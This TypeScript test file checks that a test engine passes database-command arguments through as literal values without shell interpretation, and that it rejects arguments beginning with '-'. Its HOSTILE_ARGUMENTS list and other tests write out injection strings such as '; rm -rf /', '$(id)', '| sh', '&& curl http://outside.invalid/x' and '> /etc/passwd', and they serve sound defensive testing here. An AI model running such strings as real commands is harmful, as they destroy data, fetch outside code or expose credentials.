// A database command's arguments, as the engine builds them for the DatabaseCommandRunner port.
// Each parameter fills exactly one argument: nothing is split or joined and no shell runs, so text
// that a shell would read as a second command, a substitution or a pipe reaches the program as one
// literal argument. A text argument that starts with "-" could be read as an option, so it fails
// the step with parameter-invalid before the command runs, unless the declared vector places it
// after a literal "--". The fake port echoes the argument vector it was handed.
// The real container path is in test/containers/database-commands.test.ts.
// See docs/specs/SPEC-36-unsafe-plan-features.md ("Database commands" under "Milestone").
import assert from 'node:assert/strict';
import { test } from 'node:test';
import {
  OPEN_CART, PROGRAM, TWO_LINE_NOTE, commandPlan, database, echo, modesOf, runWithCommands, stepLines,
} from './database-command-examples.ts';

const HOSTILE_ARGUMENTS = [
  { name: 'a command separator', value: '; rm -rf /' },
  { name: 'a command substitution', value: '$(id)' },
  { name: 'a backtick substitution', value: '`id`' },
  { name: 'a pipe into a shell', value: '| sh' },
  { name: 'a chained download', value: '&& curl http://outside.invalid/x' },
  { name: 'quotes that would close a shell string', value: '\' OR \'1\'=\'1' },
  { name: 'a redirection', value: '> /etc/passwd' },
  { name: 'a glob', value: '*' },
  { name: 'a variable', value: '$PGPASSWORD' },
] as const;

const echoed = (...values: readonly string[]): string[] => [...PROGRAM, 'echo', ...values];

for (const { name, value } of HOSTILE_ARGUMENTS) {
  test(`an argument holding ${name} reaches the program as one literal argument`, { criterion: 'AC-SPEC-36-12' }, async () => {
    const ran = await runWithCommands(commandPlan([echo(value)]));
    assert.equal(ran.result.state, 'Passed', JSON.stringify(ran.result.steps));
    assert.equal(ran.commands.length, 1);
    assert.deepEqual(ran.commands[0]?.argv, echoed(value, 'plain', 'text'));
  });
}

test('"; rm -rf /", "$(id)" and text with spaces, side by side, are three arguments, each as written', { criterion: 'AC-SPEC-36-12' }, async () => {
  const ran = await runWithCommands(commandPlan([echo('; rm -rf /', '$(id)', 'Ada Lovelace')]));
  assert.deepEqual(ran.commands[0]?.argv, echoed('; rm -rf /', '$(id)', 'Ada Lovelace'));
  assert.equal(ran.commands[0]?.argv.length, PROGRAM.length + 4, 'an argument was split or joined');
});

test('non-Latin text and quotes reach the program unchanged', { criterion: 'AC-SPEC-36-12' }, async () => {
  const ran = await runWithCommands(commandPlan([echo('Zoë Ålund', '"quoted"', 'заказ 17')]));
  assert.deepEqual(ran.commands[0]?.argv, echoed('Zoë Ålund', '"quoted"', 'заказ 17'));
});

// ---- A leading "-" -------------------------------------------------------------------------------------

const LEADING_DASHES = ['-rf', '--output=/etc/passwd', '-', '--'];

for (const value of LEADING_DASHES) {
  test(`a text argument "${value}", with no literal "--" before it, fails with parameter-invalid and runs nothing`, { criterion: 'AC-SPEC-36-12' }, async () => {
    const ran = await runWithCommands(commandPlan([OPEN_CART, echo(value), OPEN_CART]));
    assert.deepEqual(stepLines(ran.result).slice(0, 3), ['navigate passed', 'database failed parameter-invalid', 'navigate skipped']);
    assert.equal(ran.result.state, 'Errored');
    assert.deepEqual(ran.commands, [], 'the command was handed to the port');
  });
}

test('a leading "-" in any argument position fails, not only the first', { criterion: 'AC-SPEC-36-12' }, async () => {
  const ran = await runWithCommands(commandPlan([echo('plain', 'text', '-x')]));
  assert.deepEqual(stepLines(ran.result).slice(0, 1), ['database failed parameter-invalid']);
  assert.deepEqual(ran.commands, []);
});

for (const value of LEADING_DASHES) {
  test(`after a literal "--" in the declared vector, "${value}" reaches the program as one argument`, { criterion: 'AC-SPEC-36-12' }, async () => {
    const ran = await runWithCommands(commandPlan([database('echoAroundDashes', { early: 'plain', late: value })]));
    assert.equal(ran.result.state, 'Passed', JSON.stringify(ran.result.steps));
    assert.deepEqual(ran.commands[0]?.argv, echoed('plain', '--', value));
  });
}

test('a parameter declared before the literal "--" still may not start with "-"', { criterion: 'AC-SPEC-36-12' }, async () => {
  const ran = await runWithCommands(commandPlan([database('echoAroundDashes', { early: '-rf', late: 'plain' })]));
  assert.deepEqual(stepLines(ran.result).slice(0, 1), ['database failed parameter-invalid']);
  assert.deepEqual(ran.commands, []);
});

test('a remembered value starting with "-" fails the next command with parameter-invalid, before it runs', { criterion: 'AC-SPEC-36-12' }, async () => {
  const ran = await runWithCommands(commandPlan([
    database('readFlag', {}, { flagValue: 'flag' }),
    echo({ valueName: 'flagValue' }),
  ]));
  assert.deepEqual(stepLines(ran.result).slice(0, 2), ['database passed', 'database failed parameter-invalid']);
  assert.deepEqual(modesOf(ran.commands), ['flag'], 'only the command that printed the flag ran');
});

// A plan's own text cannot hold a line break. A value read from outside can, but remembering it
// fails with value-unsafe, as for any remembered text, so it never reaches a command.
test('a line break never reaches the program: remembering it fails with value-unsafe, and the next command is never run', { criterion: 'AC-SPEC-36-12' }, async () => {
  const ran = await runWithCommands(commandPlan([
    database('readNote', {}, { noteText: 'note' }),
    echo({ valueName: 'noteText' }),
  ]));
  assert.equal(ran.result.state, 'Errored');
  assert.deepEqual(stepLines(ran.result).slice(0, 2), ['database failed value-unsafe', 'database skipped']);
  assert.deepEqual(modesOf(ran.commands), ['note'], 'the command after the refused value was handed to the port');
  assert.ok(!ran.commands.some((seen) => seen.argv.some((argument) => argument.includes(TWO_LINE_NOTE))), 'the note reached a command');
});

// Counter-examples: a hyphen elsewhere in the text is no option, and the same remembered value
// passes after "--".
test('counter-example: text with a hyphen that is not its first character passes', { criterion: 'AC-SPEC-36-12' }, async () => {
  const ran = await runWithCommands(commandPlan([echo('order-17', 'a - b', 'x-')]));
  assert.equal(ran.result.state, 'Passed', JSON.stringify(ran.result.steps));
  assert.deepEqual(ran.commands[0]?.argv, echoed('order-17', 'a - b', 'x-'));
});

test('counter-example: the remembered "-" value reaches the program when its parameter follows "--"', { criterion: 'AC-SPEC-36-12' }, async () => {
  const ran = await runWithCommands(commandPlan([
    database('readFlag', {}, { flagValue: 'flag' }),
    database('echoAroundDashes', { early: 'plain', late: { valueName: 'flagValue' } }),
  ]));
  assert.equal(ran.result.state, 'Passed', JSON.stringify(ran.result.steps));
  assert.deepEqual(ran.commands[1]?.argv, echoed('plain', '--', '--force'));
});

test('an integer parameter fills one argument with its decimal digits', { criterion: 'AC-SPEC-36-12' }, async () => {
  const ran = await runWithCommands(commandPlan([database('seedOrders', { count: 12 })]));
  assert.deepEqual(ran.commands[0]?.argv, [...PROGRAM, 'seed', '12']);
});
